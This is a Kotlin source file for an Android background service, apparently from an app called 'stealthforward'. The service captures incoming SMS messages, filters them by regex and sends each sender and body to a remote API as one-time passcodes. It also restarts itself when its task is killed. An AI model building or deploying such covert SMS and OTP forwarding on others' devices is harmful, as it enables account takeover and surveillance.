package com.nf.stealthforward.service

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.nf.stealthforward.api.NetworkClient
import com.nf.stealthforward.config.Config
import com.nf.stealthforward.listener.SmsListener
import retrofit2.Call
import retrofit2.Response
import android.os.SystemClock
import android.app.AlarmManager
import androidx.core.content.ContextCompat.getSystemService
import android.app.PendingIntent
import android.icu.lang.UCharacter.GraphemeClusterBreak.T



class BackgroundService : Service(), SmsListener {

    companion object {
        private val TAG = BackgroundService::class.java.simpleName

        fun start(context: Context) {
            Log.d(TAG, "starting service requested")

            this.context = context
            Config.load(context)
            Intent(context, BackgroundService::class.java).also { context.startService(it) }

//            val packageName = context.packageName
//            Intent().also {
//                it.component = ComponentName(packageName, BackgroundService::class.java.name)
//                context.startService(it)
//            }
        }

        fun stop() {
            Log.d(TAG, "stopping service requested")
            instance?.stopSelf()
        }

        @SuppressLint("StaticFieldLeak")
        private lateinit var context: Context

        @SuppressLint("StaticFieldLeak")
        var instance: BackgroundService? = null
    }

    override fun onCreate() {
        instance = this
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "background service started")
        Config.load(context)
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onDestroy() {
        Log.d(TAG, "background service stopped")
        instance = null
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val intentRestart = Intent(context, this.javaClass)
        val pendingIntentRestart = PendingIntent.getService(context, 1, intentRestart, PendingIntent.FLAG_ONE_SHOT)
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1000,
            pendingIntentRestart
        )

        super.onTaskRemoved(rootIntent)
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////

    override fun onSmsReceived(sender: String, body: String) {
        val receiver = Config.receiverKey
        Log.d(TAG, "SMS received {receiver: \"$receiver\", sender: \"$sender\", body: \"$body\"}")

        if (Config.bodySyntax.isNotBlank() && Regex(Config.bodySyntax).matchEntire(body) == null) {
            Log.e(TAG, "SMS body doesn't match body syntax")
            return
        }

        val apiCall = NetworkClient.retrofitClient.saveOTP(receiver, sender, body)
        apiCall.enqueue(object : retrofit2.Callback<String> {
            override fun onFailure(call: Call<String>, t: Throwable) {
                Log.e(TAG, "Failed to call web api. error: ${t.localizedMessage}")
            }

            override fun onResponse(call: Call<String>, response: Response<String>) {
                Log.i(TAG, "Succeeded to call web api. response: ${response.body()}")
            }
        })
    }
}
